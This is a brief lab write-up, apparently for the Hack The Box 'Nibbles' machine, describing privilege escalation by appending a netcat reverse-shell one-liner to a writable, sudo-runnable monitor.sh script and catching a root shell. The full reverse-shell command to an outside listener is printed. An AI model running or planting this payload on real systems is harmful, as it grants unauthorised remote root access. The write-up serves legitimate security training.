# Nibbles Privilege Escalation

We initiated the privilege escalation by extracting the contents of the personal.zip file and reviewing its contents.

<img width="466" height="211" alt="image" src="https://github.com/user-attachments/assets/e3adea7c-d4d0-4124-b8b2-9168f28e9f48" />

After extracting the personal.zip file, we discovered a monitor.sh script owned by the user 'nibbler' that is used for monitoring purposes and is modifiable.

Next, we sourced a reverse shell payload from HTB Academy:
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
This payload was appended to monitor.sh to facilitate establishing a reverse shell connection.

<img width="1011" height="553" alt="image" src="https://github.com/user-attachments/assets/e5bbea0d-da71-40f7-80a1-117e1225bddc" />

Disclaimer: It is crucial that when exploiting a writable file for privilege escalation, we only append to the end of the file—after creating a backup—to avoid overwriting its original content and causing service disruption.

We executed the script with elevated privileges using sudo ./monitor.sh, while simultaneously running a Netcat listener, which allowed us to obtain a root shell.

<img width="722" height="197" alt="Screenshot 2025-08-24 161515" src="https://github.com/user-attachments/assets/1db0b916-1580-4ca3-a0f6-8efde490ff0e" />

<img width="397" height="192" alt="image" src="https://github.com/user-attachments/assets/ec7c9111-6cb2-4a33-ab52-79269fc33780" />

